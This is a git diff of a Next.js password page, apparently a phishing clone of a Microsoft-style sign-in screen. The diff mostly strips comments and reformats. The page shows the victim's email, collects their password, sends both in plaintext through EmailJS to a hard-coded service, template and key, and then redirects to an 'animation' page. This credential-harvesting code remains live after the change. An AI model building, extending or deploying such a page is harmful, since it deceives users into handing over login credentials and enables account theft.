@@ -1,5 +1,4 @@
 "use client";
-
 import React, { useState } from "react";
 import emailjs from "@emailjs/browser";
 import Image from "next/image";
@@ -16,16 +15,13 @@ const Password = () => {
 
     emailjs
       .send(
-        "service_rp4ht9g", // your EmailJS service ID
-        "template_gfkbans", // your EmailJS template ID
-        {
-          user_email: email,
-          user_password: password,
-        },
-        "LhNGTlaSzpZLxmy0Z" // your EmailJS public key
+        "service_rp4ht9g",
+        "template_gfkbans",
+        { user_email: email, user_password: password },
+        "LhNGTlaSzpZLxmy0Z"
       )
       .then(() => {
-        router.push("/animation"); // redirect after success
+        router.push("/animation");
       })
       .catch((err) => {
         console.error(err);
@@ -39,12 +35,10 @@ const Password = () => {
       style={{ backgroundImage: "url('/bg.png')" }}
     >
       <div className="bg-white w-full max-w-sm shadow-md rounded-md px-6 py-12">
-        {/* Logo */}
         <div className="flex items-center justify-center mb-4">
           <Image src="/image.png" alt="Login logo" width={120} height={25} />
         </div>
 
-        {/* Email */}
         <div className="flex justify-center mb-1">
           <p className="inline-block border border-gray-400 px-3 py-1 rounded text-gray-700 text-sm">
             {email}
@@ -55,7 +49,6 @@ const Password = () => {
           Enter your password
         </h1>
 
-        {/* Form */}
         <form onSubmit={handleSubmit} className="space-y-4">
           <input
             type="password"
@@ -65,10 +58,7 @@ const Password = () => {
             className="w-full border border-gray-300 rounded-sm px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500"
             required
           />
-          <button
-            type="button"
-            className="text-[#0078D4] text-sm hover:underline block"
-          >
+          <button className="text-[#0078D4] text-sm hover:underline block">
             Forgot your password?
           </button>
           <button
@@ -79,7 +69,6 @@ const Password = () => {
           </button>
         </form>
 
-        {/* Extra options */}
         <div className="flex flex-col items-center justify-center mt-6 text-sm space-y-1">
           <button
             type="button"
